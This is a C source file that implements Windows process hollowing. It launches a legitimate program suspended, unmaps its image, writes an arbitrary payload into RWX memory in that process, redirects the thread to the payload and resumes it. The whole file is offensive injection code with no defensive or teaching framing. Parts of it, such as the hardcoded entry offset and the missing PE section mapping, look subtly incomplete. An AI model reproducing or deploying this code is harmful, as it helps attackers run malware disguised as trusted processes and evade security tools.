#include <windows.h>
#include <stdio.h>
#include "process_hollowing.h"

// Hollow target_path (e.g., notepad.exe) and inject payload_buffer (DLL or shellcode)
int hollow_process(const char* target_path, LPVOID payload_buffer, DWORD payload_size) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    printf("[Process Hollowing] Starting target process in suspended mode: %s\n", target_path);

    if (!CreateProcessA(
        target_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[!] Failed to start target process. Error code: %lu\n", GetLastError());
        return 0;
    }

    printf("[+] Target process created in suspended mode (PID: %lu)\n", pi.dwProcessId);

    // Retrieve basic information about the target process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] Failed to get thread context. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 0;
    }

#ifdef _WIN64
    DWORD64 peb_address = ctx.Rdx;  // PEB address on 64-bit
#else
    DWORD peb_address = ctx.Ebx;    // PEB address on 32-bit
#endif

    // Read Image Base Address from PEB
    LPVOID base_address = NULL;
    SIZE_T bytes_read;
    ReadProcessMemory(
        pi.hProcess,
#ifdef _WIN64
        (LPCVOID)(peb_address + 0x10),
#else
        (LPCVOID)(peb_address + 0x8),
#endif
        &base_address,
        sizeof(LPVOID),
        &bytes_read
    );

    printf("[+] Original base address of target process: %p\n", base_address);

    // Unmap the original process image
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NTSTATUS(WINAPI * NtUnmapViewOfSection)(HANDLE, PVOID) =
        (NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(ntdll, "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, base_address);
    printf("[+] Unmapped original process image.\n");

    // Allocate memory for new payload
    LPVOID new_base = VirtualAllocEx(pi.hProcess, base_address, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_base) {
        printf("[!] Failed to allocate memory in target process. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 0;
    }

    printf("[+] Allocated memory for payload at: %p\n", new_base);

    // Write payload to target process memory
    SIZE_T bytes_written;
    if (!WriteProcessMemory(pi.hProcess, new_base, payload_buffer, payload_size, &bytes_written)) {
        printf("[!] Failed to write payload to target. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 0;
    }

    printf("[+] Injected payload (%llu bytes written).\n", (unsigned long long)bytes_written);

    // Update thread context to new entry point
    CONTEXT new_ctx = ctx;
#ifdef _WIN64
    DWORD64 entry_point = (DWORD64)new_base + 0x1000; // adjust offset based on payload
    new_ctx.Rcx = entry_point;
#else
    DWORD entry_point = (DWORD)new_base + 0x1000;
    new_ctx.Eax = entry_point;
#endif

    if (!SetThreadContext(pi.hThread, &new_ctx)) {
        printf("[!] Failed to update thread context. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 0;
    }

    printf("[+] Updated thread context to payload entry point: %p\n", (LPVOID)entry_point);

    // Resume the thread, executing payload inside hollowed process
    ResumeThread(pi.hThread);
    printf("[+] Target process hollowed and resumed.\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;
}
